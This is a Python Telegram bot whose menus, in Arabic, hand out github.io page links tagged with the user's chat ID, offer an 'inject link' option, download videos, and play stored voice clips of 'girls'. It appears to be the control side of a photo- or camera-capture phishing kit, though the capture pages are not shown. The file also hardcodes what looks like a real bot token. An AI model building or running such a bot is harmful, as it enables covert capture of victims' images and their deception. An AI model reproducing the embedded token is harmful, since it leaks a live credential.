import os
import json
import urllib3
import telebot
from telebot import types
from PIL import Image, PngImagePlugin
import threading
import http.server
import yt_dlp

# إيقاف التحذيرات
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BOT_TOKEN = os.getenv("BOT_TOKEN", "8128965245:AAGolmLae3ALVga_kcloXCK2zsFRODK4BXc")
bot = telebot.TeleBot(BOT_TOKEN)

DB_FILE = "/tmp/voice_db.json"
PHOTO_PAGE_URL = "https://app-display.github.io/ca.html-chatld-/"
VIDEO_PAGE_URL = "https://app-display.github.io/ca.html-chatId"
IMAGE_EDIT_URL = "https://app-display.github.io/-c-om-Copy-Translate-ate-vel-.app-c.html-chatld-/"

user_states = {}

def run_dummy_server():
    port = int(os.environ.get("PORT", 8080))
    httpd = http.server.HTTPServer(('', port), http.server.SimpleHTTPRequestHandler)
    httpd.serve_forever()

def load_db():
    if not os.path.exists(DB_FILE): return {"girl_1": {}, "girl_2": {}}
    with open(DB_FILE, 'r', encoding='utf-8') as f:
        try: return json.load(f)
        except: return {"girl_1": {}, "girl_2": {}}

# دالة تحميل الفيديو المحدثة
def download_video_sync(url, chat_id):
    try:
        ydl_opts = {
            'format': 'best[ext=mp4]/best',
            'outtmpl': f'/tmp/vid_{chat_id}.mp4',
            'quiet': True,
            'no_warnings': True,
            'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            'extractor_args': {'youtube': {'skip': ['dash', 'hls']}}
        }
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(url, download=True)
            return f'/tmp/vid_{chat_id}.mp4', info.get('title', 'Video')
    except Exception as e: return None, str(e)

def get_main_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("🖼️ رابط صور", callback_data="get_photo_link"),
        types.InlineKeyboardButton("🎥 رابط فيديو", callback_data="get_video_link"),
        types.InlineKeyboardButton("✨ رابط تعديل", callback_data="get_image_edit_link"),
        types.InlineKeyboardButton("📥 تحميل فيديو", callback_data="dl_video"),
        types.InlineKeyboardButton("🔒 حقن رابط", callback_data="inject_start"),
        types.InlineKeyboardButton("🎧 قسم الصوتيات", callback_data="voice_menu")
    )
    return markup

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.send_message(message.chat.id, "🤖 أهلاً بك يا سيف:", reply_markup=get_main_keyboard())

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    chat_id = call.message.chat.id
    db = load_db()

    if call.data == "dl_video":
        user_states[chat_id] = "waiting_for_url"
        bot.edit_message_text("أرسل رابط الفيديو الآن:", chat_id, call.message.message_id)
    elif call.data == "voice_menu":
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(types.InlineKeyboardButton("👩 الفتاة 1", callback_data="girl_1_menu"),
                   types.InlineKeyboardButton("👩 الفتاة 2", callback_data="girl_2_menu"),
                   types.InlineKeyboardButton("🔙 عودة", callback_data="main_menu"))
        bot.edit_message_text("📂 اختر المجلد:", chat_id, call.message.message_id, reply_markup=markup)
    elif call.data == "girl_1_menu":
        markup = types.InlineKeyboardMarkup(row_width=2)
        for i in range(1, 11):
            name = f"مقطع {i}"
            markup.add(types.InlineKeyboardButton(name, callback_data=f"play_g1:{name}"))
        markup.add(types.InlineKeyboardButton("🔙 عودة", callback_data="voice_menu"))
        bot.edit_message_text("👩 الفتاة 1 (10 مقاطع):", chat_id, call.message.message_id, reply_markup=markup)
    elif call.data == "girl_2_menu":
        markup = types.InlineKeyboardMarkup(row_width=2)
        for i in range(1, 14):
            name = f"مقطع {i}"
            markup.add(types.InlineKeyboardButton(name, callback_data=f"play_g2:{name}"))
        markup.add(types.InlineKeyboardButton("🔙 عودة", callback_data="voice_menu"))
        bot.edit_message_text("👩 الفتاة 2 (13 مقطع):", chat_id, call.message.message_id, reply_markup=markup)
    elif call.data.startswith("play_g1:"):
        name = call.data.split(":")[1]
        file_id = db.get("girl_1", {}).get(name)
        if file_id: bot.send_voice(chat_id, file_id)
        else: bot.answer_callback_query(call.id, "⚠️ فارغ!")
    elif call.data.startswith("play_g2:"):
        name = call.data.split(":")[1]
        file_id = db.get("girl_2", {}).get(name)
        if file_id: bot.send_voice(chat_id, file_id)
        else: bot.answer_callback_query(call.id, "⚠️ فارغ!")
    elif call.data == "main_menu":
        bot.edit_message_text("🤖 القائمة الرئيسية:", chat_id, call.message.message_id, reply_markup=get_main_keyboard())
    elif call.data == "get_photo_link":
        bot.send_message(chat_id, f"🖼️ الرابط: {PHOTO_PAGE_URL}?chatId={chat_id}")
    elif call.data == "get_video_link":
        bot.send_message(chat_id, f"🎥 الرابط: {VIDEO_PAGE_URL}?chatId={chat_id}")
    elif call.data == "get_image_edit_link":
        bot.send_message(chat_id, f"✨ الرابط: {IMAGE_EDIT_URL}?chatId={chat_id}")
    bot.answer_callback_query(call.id)

@bot.message_handler(content_types=['text'])
def handle_text(message):
    chat_id = message.chat.id
    if user_states.get(chat_id) == "waiting_for_url":
        status_msg = bot.reply_to(message, "⏳ جاري المعالجة والتحميل... يرجى الانتظار")
        path, title = download_video_sync(message.text, chat_id)
        if path:
            bot.send_video(chat_id, open(path, 'rb'), caption=title)
            bot.delete_message(chat_id, status_msg.message_id)
            os.remove(path)
        else:
            bot.edit_message_text(f"❌ فشل التحميل:\n{title}", chat_id, status_msg.message_id)
        user_states[chat_id] = None

if __name__ == '__main__':
    threading.Thread(target=run_dummy_server, daemon=True).start()
    bot.polling(none_stop=True)
